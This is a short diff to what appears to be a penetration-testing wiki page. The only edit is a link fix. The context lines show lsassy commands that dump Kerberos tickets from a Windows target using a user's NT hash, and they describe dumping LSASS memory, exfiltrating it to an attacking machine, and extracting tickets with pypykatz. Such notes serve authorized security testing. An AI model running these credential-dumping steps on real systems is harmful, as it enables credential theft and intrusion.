@@ -51,7 +51,7 @@ lsassy -d <DOMAIN.LOCAL> -u <USER> -H <NTHash> <TARGET> -K '/tmp/kerberos_ticket
 lsassy -k <TARGET> -K '/tmp/kerberos_tickets'
 ```
 
-We also can do it manually by dumping LSASS memory using one of [this techniques](broken-reference), exfiltrate the dump on our attacking machine, and then retrieve tickets using [pypykatz](https://github.com/skelsec/pypykatz).
+We also can do it manually by dumping LSASS memory using one of [this techniques](/broken/pages/wAjDzPwV8LLtm6RWJbLf), exfiltrate the dump on our attacking machine, and then retrieve tickets using [pypykatz](https://github.com/skelsec/pypykatz).
 
 ```bash
 # Example of a dump where Z: is mounted on the attacking host
